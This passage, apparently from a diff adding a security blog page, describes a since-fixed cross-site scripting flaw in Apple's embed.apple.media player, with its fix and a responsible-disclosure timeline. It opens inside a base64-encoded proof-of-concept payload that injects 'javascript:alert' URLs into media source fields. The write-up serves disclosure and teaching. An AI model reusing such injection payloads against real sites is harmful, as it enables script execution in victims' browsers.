XNjcmlwdDphbGVydCgyKSIsInN0YXRpY0NUQSI6bnVsbCwiaWNvbkNUQSI6bnVsbCwidHdpdHRlciI6IiNQbGFuZXRPZlRoZUFwcHMiLCJmYWNlYm9vayI6bnVsbCwidHVtYmxyIjoiI1BsYW5ldE9mVGhlQXBwcyJ9LCJhcnR3b3JrIjoiaHR0cHM6Ly9lbWJlZC5hcHBsZS5tZWRpYS9wdWJsaWMvdHJhbnNjb2Rlcy81OGE1ZDVjODI3ZTQ5MTAwMGMxZmFmNWYvNjY4Y2MxYWItMjliNi00MWVhLTg1YWYtMjk5NGI4ZjM1MWUyXzMwOGEyZDQzLTJjY2EtNDA3NC05OWU1LTUzOGE1ZTgwMjE2ZF9wb3N0ZXJmcmFtZV8xMDgwLnBuZyIsImR1cmF0aW9uIjoxNDguNDUyLCJ3aWR0aCI6MTkyMCwiaGVpZ2h0IjoxMDgwfSwibWVkaWEiOlt7Im1pbWVUeXBlIjoidGV4dC9odG1sIiwic3JjIjoiamF2YXNjcmlwdDphbGVydCgzKSIsImxhYmVsIjoibTN1OC1wbGF5bGlzdCJ9LHsibWltZVR5cGUiOiJ0ZXh0L2h0bWwiLCJzcmMiOiJqYXZhc2NyaXB0OmFsZXJ0KDQpIiwibGFiZWwiOiJ3ZWJtIiwiZHVyYXRpb24iOjE0OC40NTIsIndpZHRoIjoxOTIwLCJoZWlnaHQiOjEwODB9LHsibWltZVR5cGUiOiJ0ZXh0L2h0bWwiLCJzcmMiOiJqYXZhc2NyaXB0OmFsZXJ0KDUpIiwibGFiZWwiOiJtcDQgaGlnaCIsImR1cmF0aW9uIjoxNDguNTIyLCJ3aWR0aCI6MTkyMCwiaGVpZ2h0IjoxMDgwfSx7Im1pbWVUeXBlIjoidGV4dC9odG1sIiwic3JjIjoiamF2YXNjcmlwdDphbGVydCg2KSIsImxhYmVsIjoib2dnIiwiZHVyYXRpb24iOjE0OC40NDgsIndpZHRoIjoxOTIwLCJoZWlnaHQiOjEwODB9XX1dfQ==" target="_blank" rel="noopener">this</a>, which is pretty neat.</p>
+<img src="/2018/02/23/Apple-XSS/xss2.jpg" title="xss2">
+<h1 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h1><p>The fix appears to be that it’s only loading resources from whitelisted domains. I looked at trying to include Data URIs, and load from third-party resources over HTTP and HTTPS, and used general bypass techniques to load a third-party domain, but it appears sufficent. </p>
+<p>The one thing that’s no-longer required is that the IDs don’t need to match, so you can just include <a href="https://embed.apple.media/public/assets/player.html?id=&amp;src=https://embed.apple.media/public/embeds/59a0662a064b5400127610ba.json" target="_blank" rel="noopener">https://embed.apple.media/public/assets/player.html?id=&amp;src=https://embed.apple.media/public/embeds/59a0662a064b5400127610ba.json</a> and it will still render.</p>
+<p>Let me know if you find another way to load another resource, after you report it and they resolve it responsibly ofcourse :). </p>
+<h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><p>To give Apple credit, whilst it did take a long time to resolve, embed.apple.media isn’t exactly a high priority domain, so I reported the issue in May 2017 it was resolved in January 2018, the Apple team did respond in a timely manner to all my emails.</p>
+<ul>
+<li>Initial email reporting issue May 25 2017</li>
+<li>Response from Apple May 26 2017</li>
+<li>Request on status June 12 2017</li>
+<li>Response from Apple June 12 2017</li>
+<li>Request on status October 11 2017</li>
+<li>Response from Apple October 12 2017</li>
+<li>Request on status December 12 2017</li>
+<li>Response from Apple December 15 2017</li>
+<li>Request on status February 05 2018</li>
+<li>Response from Apple confirming resolved February 05 2018</li>
+<li><a href="https://support.apple.com/en-gb/HT201536" target="_blank" rel="noopener">Hall Of Fame</a> 🎉</li>
+</ul>
+
+                    
+                    <!-- Tags Bottom -->
+                    
+                        <div class="tags-container-bottom">
+                            <i class="fa fa-tag pr3 text-main-color"></i><a class="fw3 ph1 dib" href="/tags/XSS/">#XSS</a> <a class="fw3 ph1 dib" href="/tags/Security/">#Security</a>
+                        </div>
+                    
+
+                    <!-- Comments -->
+                    
+<div id="disqus_thread" class="mt5">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+
+
+
+                </div>
+                <div class="fl w-100 w-30-l center fw3 lh-copy pl4-ns tl black-50">
+                    
+                    <hr class="dn-l mw4 black-50 mt5">
+                    
+                    <!-- Widget 1: About -->
+                    <div class="mt5 mt0-l">
+    <article class="dt db-l mw8 mw8-m mw5-ns center ml0-l bg-white mv3">
+        <div class="dn dtc-m db-l v-mid tc pr4 pr0-l" style="min-width: 6rem;">
+            <img src="https://pbs.twimg.com/profile_images/877900659319853056/iaUa6_XV_400x400.jpg" class="mb4-l br-100 h3 w3 h4-l w4-l dib" title="Lewis Ardern">
+        </div>
+        <div style="color:#7C8999" class="dtc db-l v-mid lh-copy measure center f6 -50 tj">
+            Hello, I am Lewis Ardern, pictured above. I work as a Security Consultant with a strong focus on Web Security. <br>Currently based and working in London.
+        </div>
+    </article>
+</div>
+
+                    <hr class="dn-l mw4 black-50 mt5">
+                    
+                    <!-- Widget 2: Categories -->
+                    
+
+                    <!-- Widget 3: Recent Posts -->
+                    <div class="mt5 tc tl-l">
+    <h3>Recent Posts</h3>
+    
+        <p>
+            <a href="/2018/12/07/angularjs-bxss/">Blind XSS AngularJS Payloads</a>
+        </p>
+    
+        <p>
+            <a href="/2018/02/23/Apple-XSS/">Planet Of The XSS</a>
+        </p>
+    
+        <p>
+            <a href="/2017/12/10/blind-xss/">Ode To Blind XSS</a>
+        </p>
+    
+</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<!-- Footer -->
+<div class="bg-1 ph2 ph5-ns pv5">
+        <div class="mv8">
+            <div class="center tc">
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="https://twitter.com/LewisArdern" target="_blank">
+                            <i class="fa fa-twitter"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="https://github.com/LewisArdern" target="_blank">
+                            <i class="fa fa-github"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="mailto:lewis@ardern.io" target="_blank">
+                            <i class="fa fa-envelope"></i>
+                        </a>
+                    </div>
+                
+            </div>
+            <div class="f6 f5-ns center tc white pt5 fw3">
+                ardern.io ~ © 2018  <!--anodyne theme-->
+            </div>
+        </div>
+    </div>
+
+<!-- After Footer -->
+<!-- Disqus Comments -->
+
+<script type="text/javascript">
+    var disqus_shortname = 'ardernio';
+
+    (function(){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+</body>
+
+</html>
